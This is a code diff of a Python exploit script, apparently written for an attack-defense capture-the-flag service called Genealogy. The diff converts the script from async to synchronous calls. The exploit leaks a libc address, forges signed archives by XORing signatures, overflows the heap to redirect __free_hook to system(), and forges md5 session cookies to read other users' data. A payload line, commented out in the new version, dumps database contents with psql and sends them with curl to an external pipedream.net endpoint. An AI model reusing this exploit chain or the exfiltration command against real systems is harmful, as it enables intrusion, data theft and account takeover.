@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import asyncio
+import hashlib
 import itertools
 import random
 import string
@@ -10,8 +10,8 @@ from pwn import ELF
 
 from client import GenealogyClient
 
-# PAYLOAD = b"/bin/sh -c 'ls -la'"
-PAYLOAD = b"apt-get install -y postgresql-client; echo 'SELECT title FROM genealogy_trees;' | PGPASSWORD=genealogy psql -h database -p 6432 -U genealogy genealogy | grep -oP '\w{10,}=' > flags.txt; curl --data @flags.txt https://enye1l83zkkqe5m.m.pipedream.net/flags"
+# PAYLOAD = b"apt-get install -y postgresql-client; echo 'SELECT title FROM genealogy_trees;' | PGPASSWORD=genealogy psql -h database -p 6432 -U genealogy genealogy | grep -oP '\w{10,}=' > flags.txt; curl --data @flags.txt https://enye1l83zkkqe5m.m.pipedream.net/flags"
+PAYLOAD = b"echo -n a > ./keys/cookie.key"
 assert len(PAYLOAD) < 60 * 8
 
 PORT = 8888
@@ -23,21 +23,22 @@ def generate_random_string(length: int = 10, alphabet: str = string.ascii_lowerc
     return "".join(random.sample(alphabet, length))
 
 
-async def get_libc_address(endpoint: str):
+def get_libc_address(endpoint: str):
     login = generate_random_string()
     password = generate_random_string()
 
-    async with GenealogyClient(endpoint) as client:
-        await client.create_user(login, password)
-        await client.login(login, password)
-        await client.create_tree("title", "description")
+    with GenealogyClient(endpoint) as client:
+        client.create_user(login, password)
+        client.login(login, password)
+        client.create_tree("title", "description")
 
-        parent_id = await client.create_person("", 0, 0, None, None)
-        person_id = await client.create_person("", 0, 0, parent_id, None)
-        await client.update_tree("title", "description", person_id)
+        parent_id = client.create_person("", 0, 0, None, None)
+        person_id = client.create_person("", 0, 0, parent_id, None)
+        client.update_tree("description", person_id)
 
-        archive = await client.download_tree_archive()
-        parsed_archive = await client.check_tree_archive(archive)
+        archive = client.download_tree_archive()
+        print_bytes_hex(archive)
+        parsed_archive = client.check_tree_archive(archive)
         leaked_address = parsed_archive["tree"]["person"]["parents"][0]["birth_date"]
         print("Leaked address:", hex(leaked_address))
 
@@ -87,34 +88,34 @@ def generate_payload(total_length: int) -> list[int]:
     return result + list(range(1, total_length - len(result) + 1))
 
 
-async def generate_first_archive(endpoint: str) -> tuple[int, bytes, bytes]:
+def generate_first_archive(endpoint: str) -> tuple[int, bytes, bytes]:
     login = generate_random_string()
     password = generate_random_string()
 
     # 60 is max size of owners list
     payload = generate_payload(60)
 
-    # 0x257 is desired total length, 397 is a total size of other fields (may change if you change PAYLOAD)
-    description_length = 0x257 - 397
+    # 0x257 is desired total length, 173 is a total size of other fields (may change if you change PAYLOAD)
+    description_length = 0x257 - 173
 
-    async with GenealogyClient(endpoint) as client:
-        user_id = await client.create_user(login, password)
-        await client.login(login, password)
+    with GenealogyClient(endpoint) as client:
+        user_id = client.create_user(login, password)
+        client.login(login, password)
         # Put enough chunks to tcache (2 will be enough)
-        grandparent = await client.create_person("", 1, 2, None, None)
-        parent = await client.create_person("", 1, 2, grandparent, None)
-        root = await client.create_person("", 1, 2, parent, None)
-        await client.create_tree("", "x" * description_length, root)
+        grandparent = client.create_person("", 1, 2, None, None)
+        parent = client.create_person("", 1, 2, grandparent, None)
+        root = client.create_person("", 1, 2, parent, None)
+        client.create_tree("", "x" * description_length, root)
 
-        await client.update_owners(payload)
+        client.update_owners(payload)
 
-        archive_with_signature = await client.download_tree_archive()
+        archive_with_signature = client.download_tree_archive()
 
     archive, signature = extract_archive_and_signature(archive_with_signature)
     return user_id, archive, signature
 
 
-async def generate_second_archive(endpoint: str, user_id_length: int, total_length: int) -> tuple[str, str, bytes, bytes]:
+def generate_second_archive(endpoint: str, user_id_length: int, total_length: int) -> tuple[str, str, bytes, bytes]:
     login = generate_random_string()
     password = generate_random_string()
 
@@ -123,36 +124,35 @@ async def generate_second_archive(endpoint: str, user_id_length: int, total_leng
     title_length = total_length - user_id_length - 1 - 3
     title = "x" * title_length
 
-    async with GenealogyClient(endpoint) as client:
-        await client.create_user(login, password)
-        await client.login(login, password)
-        await client.create_tree(title, "")
+    with GenealogyClient(endpoint) as client:
+        client.create_user(login, password)
+        client.login(login, password)
+        client.create_tree(title, "")
 
-        archive_with_signature = await client.download_tree_archive()
+        archive_with_signature = client.download_tree_archive()
 
     archive, signature = extract_archive_and_signature(archive_with_signature)
     return login, password, archive, signature
 
 
-async def generate_third_archive(endpoint: str, login: str, password: str, description: str, free_hook_address: int, system_address: int):
-    async with GenealogyClient(endpoint) as client:
-        await client.login(login, password)
-        tree = await client.get_tree()
+def generate_third_archive(endpoint: str, login: str, password: str, description: str, free_hook_address: int, system_address: int):
+    with GenealogyClient(endpoint) as client:
+        client.login(login, password)
+        tree = client.get_tree()
 
-        # await client.update_owners([0, 0x1f1, free_hook_address])
-        await client.update_owners([0, 0x1c1, free_hook_address])
+        client.update_owners([0, 0x1c1, free_hook_address])
 
-        a = await client.create_person("", 0, 0, None, None)
-        b = await client.create_person("", 0, 0, None, None)
-        c = await client.create_person("", system_address, 0, a, b)
-        d = await client.create_person("", system_address, 0, None, None)
-        e = await client.create_person("", 0, 0, c, d)
-        f = await client.create_person("", 0, 0, None, None)
-        g = await client.create_person("", 0, 0, e, f)
+        a = client.create_person("", 0, 0, None, None)
+        b = client.create_person("", 0, 0, None, None)
+        c = client.create_person("", system_address, 0, a, b)
+        d = client.create_person("", system_address, 0, None, None)
+        e = client.create_person("", 0, 0, c, d)
+        f = client.create_person("", 0, 0, None, None)
+        g = client.create_person("", 0, 0, e, f)
 
-        await client.update_tree(tree["title"], description, g)
+        client.update_tree(description, g)
 
-        archive_with_signature = await client.download_tree_archive()
+        archive_with_signature = client.download_tree_archive()
 
     archive, signature = extract_archive_and_signature(archive_with_signature)
     return archive, signature
@@ -163,13 +163,13 @@ def xor(array1: Iterable, array2: Iterable) -> Iterable:
         yield x1 ^ x2
 
 
-async def rce(endpoint: str, libc_address: int):
+def rce(endpoint: str, libc_address: int):
     # libc-2.31.so is extracted from the docker image (gcc:11-bullseye)
     # If it will change in future, just replace file here.
     libc = ELF("./libc-2.31.so")
     libc.address = libc_address
 
-    user_id, archive1, signature1 = await generate_first_archive(endpoint)
+    user_id, archive1, signature1 = generate_first_archive(endpoint)
     print("Archive for user 1:")
     print_bytes_hex(archive1)
     print("Was padded by:", end=" ")
@@ -178,7 +178,7 @@ async def rce(endpoint: str, libc_address: int):
     print("Signature for user 1:", end=" ")
     print_bytes_hex(signature1)
 
-    login2, password2, archive2, signature2 = await generate_second_archive(endpoint, 1 if user_id < 127 else 2, len(archive1))
+    login2, password2, archive2, signature2 = generate_second_archive(endpoint, 1 if user_id < 127 else 2, len(archive1))
     print("Archive for user 2:")
     print_bytes_hex(archive2)
     print("Was padded by:", end=" ")
@@ -191,7 +191,7 @@ async def rce(endpoint: str, libc_address: int):
 
     padding_length = len(length_and_padding1) - 2
     description = length_and_padding1[2:].decode() + "x" * (length_and_padding1[1] - padding_length)
-    archive3, signature3 = await generate_third_archive(endpoint, login2, password2, description, libc.symbols["__free_hook"], libc.symbols["system"])
+    archive3, signature3 = generate_third_archive(endpoint, login2, password2, description, libc.symbols["__free_hook"], libc.symbols["system"])
     print("Archive for user 3:")
     print_bytes_hex(archive3)
     print("Was padded by:", end=" ")
@@ -204,13 +204,25 @@ async def rce(endpoint: str, libc_address: int):
     hacked_archive = archive1 + length_and_padding1 + bytes(xor(xor(signature1, signature2), suffix)) + signature3
     print("Hacked archive with buffer overflow:")
     print_bytes_hex(hacked_archive)
-    async with GenealogyClient(endpoint) as client:
-        await client.login(login2, password2)
-        await client.check_tree_archive(hacked_archive)
+    with GenealogyClient(endpoint) as client:
+        client.login(login2, password2)
+        try:
+            client.check_tree_archive(hacked_archive)
+        except:
+            pass
+
+    # if PAYLOAD has been run, then we know signing key, so we can hijack cookies
+    print("Enter flag id (user id from the service)")
+    user_id = int(input())
+
+    user_hash_cookie = hashlib.md5(b"a" + str(user_id).encode() + b"a").hexdigest()
+    with GenealogyClient(endpoint) as client:
+        r = client.client.get("/tree", cookies={"user_id": str(user_id), "user_hash": user_hash_cookie})
+    print(r.json())
 
 
-async def temp(endpoint):
-    async with GenealogyClient(endpoint) as client:
+def temp(endpoint):
+    with GenealogyClient(endpoint) as client:
         archive = [
             0x00, 0x1d, 0x02, 0xb7, 0x03, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
             0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78, 0x78,
@@ -259,15 +271,16 @@ async def temp(endpoint):
             0xff, 0xff, 0x1f, 0x07, 0x00, 0x07, 0x00, 0x07, 0x08, 0x00, 0xd0, 0xbc, 0xe3, 0xbb, 0xff, 0xff, 0x1f, 0x07,
             0x00, 0x1a, 0x00, 0xe7, 0xbf, 0x47, 0x78, 0x5c, 0xba, 0xa1, 0x9a, 0x01, 0x30, 0xe5, 0x41, 0xe3, 0x42,
         ]
-        await client.check_tree_archive(bytes(archive))
+        client.check_tree_archive(bytes(archive))
 
 
-async def main(endpoint: str):
-    libc_address = await get_libc_address(endpoint)
-    await rce(endpoint, libc_address)
-    # await temp(endpoint)
+def main(endpoint: str):
+    libc_address = get_libc_address(endpoint)
+    rce(endpoint, libc_address)
+    # temp(endpoint)
+
 
 if __name__ == "__main__":
     address = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
     endpoint = f"http://{address}:{PORT}/"
-    asyncio.run(main(endpoint))
+    main(endpoint)
